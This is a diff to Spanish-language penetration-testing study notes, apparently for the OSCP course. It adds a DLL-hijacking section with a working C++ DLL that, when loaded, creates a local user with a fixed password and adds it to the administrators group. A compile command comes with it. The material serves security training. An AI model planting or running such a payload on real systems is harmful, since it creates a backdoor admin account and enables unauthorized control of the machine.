@@ -478,6 +478,51 @@ int main() {
 
 ## DLL Hijacking
 - El concepto es reemplazar un DLL utilizado por un programa por otro DLL que contenga código malicioso para elevar privilegios.
+- Hipoteticamente sabemos que el programa carga un DLL que no existe en el sistema, entonces podemos crear un DLL con el mismo nombre y cargarlo en la memoria del proceso.
+- O también hipoteticamente sabemos que el programa carga un DLL que existe en el sistema, pero lo reemplazamos por otro DLL que contenga código malicioso.
+
+#### Ejemplo de DLL Hijacking
+
+```cpp
+
+#include <stdlib.h>
+#include <windows.h>
+
+// Super inyección mega básica del curso OSCP
+// Este código implementa una DLL que realiza una inyección básica al ser cargada en un proceso.
+// La función DllMain es el punto de entrada de la DLL y ejecuta diferentes acciones dependiendo del motivo de la llamada.
+// Para compilar en Kali Linux utilizamos mingw64 con el siguiente comando:
+// x86_64-w64-mingw32-gcc SuperBasicInjection.cpp --shared -o SomeMissingDLL.dll
+// Para compilar desde Visual Studio, simplemente cree un proyecto de DLL y agregue este archivo fuente.
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		// Este caso se ejecuta cuando la DLL es cargada en un proceso.
+		// Aquí se realiza la inyección de código.
+		// En este ejemplo, se crea un usuario local con privilegios de administrador.
+		int i;
+		i = system("net user /add test-account test1234"); // Crea un usuario llamado "test-account" con contraseña "test1234".
+		i = system("net localgroup administrators test-account /add"); // Agrega el usuario al grupo de administradores locales.
+		break;
+	case DLL_THREAD_ATTACH:
+		// Este caso se ejecuta cuando un nuevo hilo se crea en el proceso que cargó la DLL.
+		break;
+	case DLL_THREAD_DETACH:
+		// Este caso se ejecuta cuando un hilo que usaba la DLL termina.
+		break;
+	case DLL_PROCESS_DETACH:
+		// Este caso se ejecuta cuando la DLL es descargada del proceso.
+		break;
+	}
+	return TRUE; // Indica que la DLL se cargó correctamente.
+}
+```
+
 
 
 
